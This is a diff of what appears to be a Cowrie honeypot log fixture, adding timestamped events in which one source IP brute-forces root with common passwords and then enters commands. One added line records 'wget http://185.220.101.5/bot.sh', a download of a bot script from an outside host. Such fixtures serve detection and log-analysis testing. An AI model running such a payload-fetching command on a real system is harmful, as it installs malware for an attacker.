@@ -1,7 +1,8 @@
-{"eventid": "cowrie.login.failed", "src_ip": "192.168.1.100", "password": "123456"}
-{"eventid": "cowrie.login.failed", "src_ip": "192.168.1.100", "password": "password"}
-{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "password": "123456"}
-{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "password": "admin"}
-{"eventid": "cowrie.login.failed", "src_ip": "172.16.0.2", "password": "root"}
-{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "password": "123456"}
-{"eventid": "cowrie.command.input", "src_ip": "10.0.0.5", "input": "uname -a"}
+{"eventid": "cowrie.session.connect", "src_ip": "10.0.0.5", "timestamp": "2026-10-21T14:32:01Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "username": "root", "password": "123456", "timestamp": "2026-10-21T14:32:05Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "username": "root", "password": "password", "timestamp": "2026-10-21T14:32:10Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "10.0.0.5", "username": "root", "password": "admin", "timestamp": "2026-10-21T14:32:15Z"}
+{"eventid": "cowrie.command.input", "src_ip": "10.0.0.5", "input": "wget http://185.220.101.5/bot.sh", "timestamp": "2026-10-21T14:32:20Z"}
+{"eventid": "cowrie.command.input", "src_ip": "10.0.0.5", "input": "uname -a", "timestamp": "2026-10-21T14:32:25Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "192.168.1.100", "username": "admin", "password": "123456", "timestamp": "2026-10-21T14:33:00Z"}
+{"eventid": "cowrie.login.failed", "src_ip": "192.168.1.100", "username": "admin", "password": "password", "timestamp": "2026-10-21T14:33:05Z"}
